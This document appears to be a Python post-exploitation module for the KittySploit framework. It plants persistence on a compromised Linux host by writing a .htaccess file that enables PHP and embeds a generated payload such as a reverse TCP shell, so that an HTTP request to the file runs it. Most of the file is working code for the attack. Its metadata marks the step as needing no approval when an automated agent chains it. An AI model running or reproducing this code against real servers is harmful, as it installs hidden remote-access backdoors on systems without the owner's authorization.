#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import os
import re

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "Apache .htaccess Persistence",
        "description": (
            "Writes a persistence payload into an Apache .htaccess file. The file acts "
            "as a CGI/PHP shell triggered on HTTP access (htshells / wireghoul technique)."
        ),
        "author": [
            "wireghoul",
            "msutovsky-r7",
            "4ravind-b",
            "KittySploit Team",
        ],
        "platform": Platform.LINUX,
        "session_type": [
            SessionType.SHELL,
            SessionType.METERPRETER,
            SessionType.SSH,
        ],
        "references": [
            "https://github.com/wireghoul/htshells",
            "https://attack.mitre.org/techniques/T1546/",
        ],
        "tags": ["persistence", "apache", "htaccess", "web", "php"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    htaccess_dir = OptString(
        "/var/www/",
        "Absolute path to the web directory that will contain .htaccess",
        True,
    )
    payload_path = OptString(
        "",
        "Payload module path (e.g. payloads/singles/cmd/php/reverse_tcp)",
        True,
    )
    target = OptChoice(
        "PHP",
        "Embed generated payload as PHP eval() or Linux system() call",
        True,
        choices=["PHP", "Linux command"],
    )
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)
    skip_php_module_check = OptBool(
        False,
        "Skip apache2ctl/httpd -M PHP module verification",
        False,
        advanced=True,
    )

    _APACHE_CONFIGS = (
        "/etc/apache2/apache2.conf",
        "/etc/apache2/httpd.conf",
        "/etc/httpd/conf/httpd.conf",
        "/etc/httpd/httpd.conf",
    )

    def _htaccess_file(self) -> str:
        base = self._opt(self.htaccess_dir).rstrip("/")
        return f"{base}/.htaccess"

    def _apache_running(self) -> bool:
        output = self.linux_execute(
            "ps aux 2>/dev/null | grep -E '[a]pache2|[h]ttpd|[a]pachectl' || true"
        )
        return bool(output and output.strip())

    def _read_apache_config(self) -> str:
        for path in self._APACHE_CONFIGS:
            if self.file_exist(path):
                content = self.read_file(path)
                if content and "No such file" not in content:
                    return content
        includes = self.linux_execute(
            "grep -RhoE 'Include(Optional)?[^\\n]+' /etc/apache2 /etc/httpd 2>/dev/null | head -n 20"
        )
        merged = []
        for line in (includes or "").splitlines():
            token = line.split()[-1] if line.split() else ""
            token = token.strip('"').strip("'")
            if token.startswith("/") and self.file_exist(token):
                merged.append(self.read_file(token))
        return "\n".join(part for part in merged if part)

    def _allowoverride_all(self, directory: str, apache_config: str) -> bool:
        if not apache_config:
            return False

        current = os.path.normpath(directory.rstrip("/") or "/")
        while True:
            path_pattern = re.escape(current.rstrip("/") or "/")
            block_re = re.compile(
                rf"<Directory\s+{path_pattern}/?\s*>(.*?)</Directory>",
                re.IGNORECASE | re.DOTALL,
            )
            match = block_re.search(apache_config)
            if match and re.search(r"AllowOverride\s+All", match.group(1), re.IGNORECASE):
                return True
            if current in ("", "/"):
                break
            parent = os.path.dirname(current)
            current = parent if parent else "/"
        return False

    def _apache_php_loaded(self) -> bool:
        output = self.linux_execute(
            "(apache2ctl -M 2>/dev/null || httpd -M 2>/dev/null || apachectl -M 2>/dev/null) | tr 'A-Z' 'a-z'"
        )
        return "php" in (output or "")

    def check(self):
        if not self._opt(self.htaccess_dir):
            print_error("htaccess_dir is required")
            return False

        if not self._apache_running():
            print_error("Apache not found in process list")
            return False

        apache_config = self._read_apache_config()
        if not self._allowoverride_all(self._opt(self.htaccess_dir), apache_config):
            print_error("AllowOverride All is not enabled for the given directory")
            return False

        ht_path = self._htaccess_file()
        if not self._writable_target(ht_path, self._opt(self.htaccess_dir)):
            print_error(f"Cannot write {ht_path}")
            return False

        print_success("Apache is running and .htaccess target appears writable")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        if not self.skip_php_module_check and not self._apache_php_loaded():
            raise ProcedureError(
                FailureType.NotVulnerable,
                "PHP module does not appear loaded (apache2ctl/httpd -M)",
            )

        encoded = self._generate_payload()
        embedded = self._get_embedded_payload(encoded)
        ht_path = self._htaccess_file()

        self._maybe_backup(ht_path, "htaccess")

        htaccess_payload = f"""<Files ~ "^\\.ht">
  Require all granted
</Files>

php_flag engine on
SetHandler application/x-httpd-php

###### SHELL ###### <?php {embedded} ?>
"""

        print_status(f"Writing payload to {ht_path}")
        if not self._write_remote_file(ht_path, htaccess_payload, mode="0755"):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write to {ht_path}")

        print_good("Payload written.")
        print_status(
            "Persistence is available when the web server serves .htaccess from "
            f"{self._opt(self.htaccess_dir)} (HTTP request to /.htaccess or directory index)."
        )
        return True
